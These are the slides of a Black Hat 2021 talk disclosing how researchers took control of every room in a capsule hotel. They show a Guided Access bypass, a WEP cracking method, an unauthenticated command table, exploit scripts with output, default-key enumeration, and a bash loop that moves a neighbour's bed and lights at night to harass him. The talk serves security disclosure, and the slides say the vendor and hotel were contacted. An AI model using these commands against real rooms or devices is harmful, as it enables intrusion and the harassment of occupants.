LEXFO
Hacking a capsule hotel
Ghost in the bedrooms
BLACK HAT USA 2021

Kyasup

Plan
 Introduction  Information gathering  Exploitation  Demo  Conclusion

August 2021

2

Introduction
 Context
 Travelling in a foreign country for holidays  Booked a few nights in a brand new capsule hotel  Various modern technologies are used
 What is a capsule hotel? (Wikipedia)
 Extremely small rooms are stacked side-by-side  The open end of the capsule can be closed with a curtain  They provide an alternative for those who:
-- may be too drunk to return home safely -- may be too embarrassed to face their spouses -- ...are searching for convenience and low price

August 2021

3

Introduction

August 2021

4

Introduction
 Technologies
 Entrance of each floor is protected by a NFC badge  Mirror your device on the curtain with a video projector  Control your bedroom with an iPod touch given at check-in

Fig.: iPod touch, NFC badge and the key

August 2021

5

Introduction
 Application features
 The iPod touch application allows to perform these actions: -- Change the position of the adjustable bed -- Control the power of the room light -- Turn on/off the ventilation fan
 What about the security?
 The iPod touch is connected either using Bluetooth or Wi-Fi  Analyze how the system and the application work  Potentially control all the hotel bedrooms if we succeed

August 2021

6

Introduction
 Presenting you Bob
 A neighbor keeps making phone calls at 2 am: -- Asked him politely to speak more quietly, but no change -- Make society a better place, hack a Bob

Fig.: Bob, the type of person everyone loves

August 2021

7

Plan
 Introduction  Information gathering  Exploitation  Demo  Conclusion

August 2021

8

Information gathering
 Exploration of the bedroom
 A Pioma UGL2 light is present: -- No idea of what it was at a first look -- A wall-mounted light that is always available -- A red light indicates an earthquake of magnitude 4 or greater -- Used in case of emergency

Fig.: The Pioma UGL2 light

August 2021

9

Information gathering
 Exploration of the bedroom
 A Nasnos CS8020-B remote is present: -- Allows to control multiple Nasnos devices -- Uses radio waves with the 313.625MHz frequency -- Control electric curtains, light dimmers, ventilation fans..

Fig.: The Nasnos CS8020-B remote

August 2021

10

Information gathering
 Exploration of the bedroom
 A Deltadrive DS2 motor is present: -- Electric driven motor used to make the bed adjustable -- Wireless connectivity made possible with Nasnos?

Fig.: A Deltadrive motor

August 2021

11

Information gathering
 Exploration of the bedroom
 Nasnos CS8700 routers are installed in each room: -- Control Nasnos devices using a Wi-Fi environment -- Repeater that converts radio waves so that it can be used -- Allows to use an Android or iOS device as a remote -- Hidden between the walls

Fig.: A Nasnos CS8700 router

August 2021

12

Information gathering

Fig.: Architecture using only the Wi-Fi router August 2021

Fig.: Architecture using the Internet 13

Plan
 Introduction  Information gathering  Exploitation  Demo  Conclusion

August 2021

14

Exploitation
 Application features
 The iPod touch application allows to perform these actions: -- Change the position of the adjustable bed -- Control the power of the room light -- Turn on/off the ventilation fan

Fig.: Prototype of the application

August 2021

15

Exploitation
 Application security
 Cannot exit the application or switch off the iPod touch: -- Passcode asked when you triple-tap the Home button -- From the iOS documentation:
Guided Access limits your device to a single app and lets you control which features are available. To end a Guided Access session triple-click the Home button, enter your GA passcode, then tap End.

August 2021

16

Exploitation
 Application security
 Cannot exit the application or switch off the iPod touch: -- Passcode asked when you triple-tap the Home button -- From the iOS documentation:
Guided Access limits your device to a single app and lets you control which features are available. To end a Guided Access session triple-click the Home button, enter your GA passcode, then tap End.
 Guided Access is configured at runtime only  Protection no longer present if we turn off the device:
-- Drain the battery fully and reboot after connecting to power -- Access to other applications and settings

August 2021

17

Exploitation
 Device settings
 The device is enrolled in a MDM solution  Two Wi-Fi networks are saved on the device:
-- An enterprise network using WPA2 -- A network named Nasnos-CS8700_AFAF using WEP

Fig.: Exploration of the device

August 2021

18

Exploitation
 Retrieving the key
 The Nasnos network is using the WEP protocol  Different solutions can be used to obtain the key:
-- Jailbreak of the iPod touch device -- iCloud KeyChain synchronization -- Abusing WPS if it is supported -- Classic attacks against WEP
 Wi-Fi scan
 A total of 119 Nasnos access points can be detected  The SSID is based on the two last bytes of the BSSID  Authentication mode is OPEN

August 2021

19

Exploitation

Fig.: Wi-Fi scan, 119 bedrooms detected

August 2021

20

Exploitation
 Generating data
 Our wireless cards do not support injection properly  Do we need to inject packets if we control the iPod touch?
-- Monitor mode can still be used -- Find a way to generate a lot of data from the device

August 2021

21

Exploitation

 Generating data
 Our wireless cards do not support injection properly  Do we need to inject packets if we control the iPod touch?
-- Monitor mode can still be used -- Find a way to generate a lot of data from the device

 JavaScript payload that keeps generating ARP requests  Create an access point, connect the iPod to it, cache the payload  Connect the device back to the Nasnos and execute the code:
function generate() { for(i=1; i<255; i++) { img = new Image(); img.src = "http://192.168.2." + i + "/" + Math.random(); }
setTimeout(generate, 800); }

August 2021

22

Exploitation
 Key found
 Key found after a lot of IVs retrieved: CS8700H00F158  Connection successful to the Nasnos access point:
-- Router web interface accessible with default credentials -- Powered by a UART module from Beijing Simple-WiFi Co. Ltd.
 Traffic analysis
 Now we want to see what traffic the application sends  Setup a Man-in-the-Middle architecture and inspect traffic  We have an Android phone and a laptop with two wireless cards

August 2021

23

Exploitation

Fig.: Setup of the Man-in-the-Middle architecture

August 2021

24

Exploitation

 Traffic analysis
 Press every button and observe the traffic  Packets are sent to the Nasnos router on TCP port 8000  No authentication, no encryption  We are now able to control our bedroom from our laptop :)

Action Light (more) Light (less) Light on Light off Bed (up) Bed (down) Fan on Fan off

Init @LC0UO000 @LC0DO000 @LC0AB100 @LC0AB000 @LC2UO000 @LC2DO000 @LC1UP000 @LC1DW000

Long press @LC0UC000 @LC0DC000
@LC2UC000 @LC2DC000 -

End @LC0UR000 @LC0DR000
@LC2UR000 @LC2DR000 -

August 2021

25

Exploitation

$ python pwn.py ['light_on', 'light_off', 'bed_down', 'bed_up', 'fan_off', 'fan_on']

$ python pwn.py bed_up

## using payload bed_up ## sent to 192.168.2.1:8000 (18 bytes): 0000 40 4c 43 32 55 4f 30 30 30 40 4c 43 32 55 43 30 0010 30 30 ## sent to 192.168.2.1:8000 (18 bytes): 0000 40 4c 43 32 55 4f 30 30 30 40 4c 43 32 55 43 30 0010 30 30 ## sent to 192.168.2.1:8000 (18 bytes): 0000 40 4c 43 32 55 4f 30 30 30 40 4c 43 32 55 43 30 0010 30 30 ## sent to 192.168.2.1:8000 (18 bytes): 0000 40 4c 43 32 55 4f 30 30 30 40 4c 43 32 55 43 30 0010 30 30 ## sent to 192.168.2.1:8000 (18 bytes): 0000 40 4c 43 32 55 4f 30 30 30 40 4c 43 32 55 43 30 0010 30 30

@LC2UO000@LC2UC0 00
@LC2UO000@LC2UC0 00
@LC2UO000@LC2UC0 00
@LC2UO000@LC2UC0 00
@LC2UO000@LC2UC0 00

Fig.: Sending commands and transforming our bed into a sofa

August 2021

26

Exploitation
 What about the other bedrooms?
 We do not know if the key is generated or set manually  A Nasnos application is available on Google Play Store:
-- Possible to setup the Nasnos Wi-Fi directly from this app -- Reverse engineering

Fig.: The Nasnos Android application

August 2021

27

Exploitation
 Reverse engineering
 Analysis of the application does not show the key is generated  Same from the documentation of the Nasnos CS8700

August 2021

28

Exploitation
 Reverse engineering
 Analysis of the application does not show the key is generated  Same from the documentation of the Nasnos CS8700
 However, the analysis reveals another vulnerability: -- Packets are sent to the Nasnos router on UDP port 988 -- Remote configuration service from the Simple-WiFi UART -- Waits for AT instructions -- Read/write access to the router configuration -- No authentication

August 2021

29

Exploitation

$ python config.py ## sent to 192.168.2.1:988 (15 bytes): 0000 31 32 33 34 35 36 41 54 2b 4e 49 50 3d 3f 0d ## received (66 bytes): 0000 2b 4f 4b 3d 31 2c 22 31 39 32 2e 31 36 38 2e 32 0010 2e 31 22 2c 22 32 35 35 2e 32 35 35 2e 32 35 35 0020 2e 30 22 2c 22 31 39 32 2e 31 36 38 2e 32 2e 31 0030 22 2c 22 31 39 32 2e 31 36 38 2e 32 2e 31 22 0a ## sent to 192.168.2.1:988 (16 bytes): 0000 31 32 33 34 35 36 41 54 2b 53 53 49 44 3d 3f 0d ## received (27 bytes): 0000 2b 4f 4b 3d 22 4e 61 73 6e 6f 73 2d 43 53 38 37 0010 30 30 5f 32 66 61 61 22 0a 0a 00 ## sent to 192.168.2.1:988 (17 bytes): 0000 31 32 33 34 35 36 41 54 2b 45 4e 43 52 59 3d 3f ## received (8 bytes): 0000 2b 4f 4b 3d 32 0a 0a 00 ## sent to 192.168.2.1:988 (15 bytes): 0000 31 32 33 34 35 36 41 54 2b 4b 45 59 3d 3f 0d ## received (26 bytes): 0000 2b 4f 4b 3d 31 2c 31 2c 22 43 53 38 37 30 30 48 0010 30 30 46 30 36 32 22 0a 0a 00

123456AT+NIP=?.
+OK=1,"192.168.2 .1","255.255.255 .0","192.168.2.1 ","192.168.2.1".
123456AT+SSID=?.
+OK="Nasnos-CS87 00_2faa"...
123456AT+ENCRY=?
+OK=2...
123456AT+KEY=?.
+OK=1,1,"CS8700H 00F062"...

Fig.: Retrieving the configuration of the Nasnos access point

August 2021

30

Exploitation
 Another bedroom
 Left the place and travelled to another city  Came back to the hotel and got assigned to another bedroom
-- Key found for this room is CS8700H00A4F9 -- First access point key was CS8700H00F158

August 2021

31

Exploitation

 Another bedroom
 Left the place and travelled to another city  Came back to the hotel and got assigned to another bedroom
-- Key found for this room is CS8700H00A4F9 -- First access point key was CS8700H00F158

 Key generation
 Only the four last hex chars seem to change: 65536 possibilities
>>> [("CS8700H00%04X" % i) for i in range(0,65536)] 'CS8700H000000', 'CS8700H000001'...'CS8700H00FFFE', 'CS8700H00FFFF'
 Not related to the SSID, the BSSID or the room number  Capture at least 4 IVs and launch a dictionary attack  Run the laptop all night with monitor mode

August 2021

32

Exploitation

Fig.: Access to all bedrooms with a minimum of 4 IVs captured

August 2021

33

Plan
 Introduction  Information gathering  Exploitation  Demo  Conclusion

August 2021

34

Demo

August 2021

35

Demo
 Let's not forget Bob
 Time to make him doubt about the existence of ghosts

August 2021

36

Demo

 Let's not forget Bob
 Time to make him doubt about the existence of ghosts  The best scenario for an unforgettable night:
-- Perform different actions every 2 hours or so -- Transform the bed into a sofa and put it back in place -- Turn on and off the light
#!/bin/bash while :; do
sleep $((60*60*2 + RANDOM % (60*30))) ./connect.sh Nasnos-CS8700_2faf # <action> <seconds> python sweetdreams.py bed_up 25 python sweetdreams.py bed_down 25 python sweetdreams.py light_on 6 python sweetdreams.py light_off 6 done

August 2021

37

Demo

Fig.: Hoping you had a wonderful night Bob!

August 2021

38

Plan
 Introduction  Information gathering  Exploitation  Demo  Conclusion

August 2021

39

Conclusion
 Summary
 We were able to take control of all bedrooms  Exploitation using six different vulnerabilities:
-- Guided Access bypass -- Usage of WEP -- Simple-WiFi UART interface with default credentials -- Nasnos service accessible without authentication -- Read/write access to the Simple-WiFi UART configuration -- Non-random keys
 Sensitive elements were modified for the presentation  Both Nasnos and the hotel were contacted

August 2021

40

Conclusion
 Summary
 The hotel was pretty cool and took these issues seriously  These problems are now fixed with a new architecture

August 2021

41

Conclusion
 Summary
 The hotel was pretty cool and took these issues seriously  These problems are now fixed with a new architecture
 When asked about the key generation:
As for your question, the SSID and password are specified by Nasnos by default.
-- Non-random keys are generated and set by default !? -- All Nasnos CS8700 devices are vulnerable -- No answer from Nasnos

August 2021

42

LEXFO
Thanks for your attention
www.lexfo.fr LexfoSecurite contact@lexfo.fr

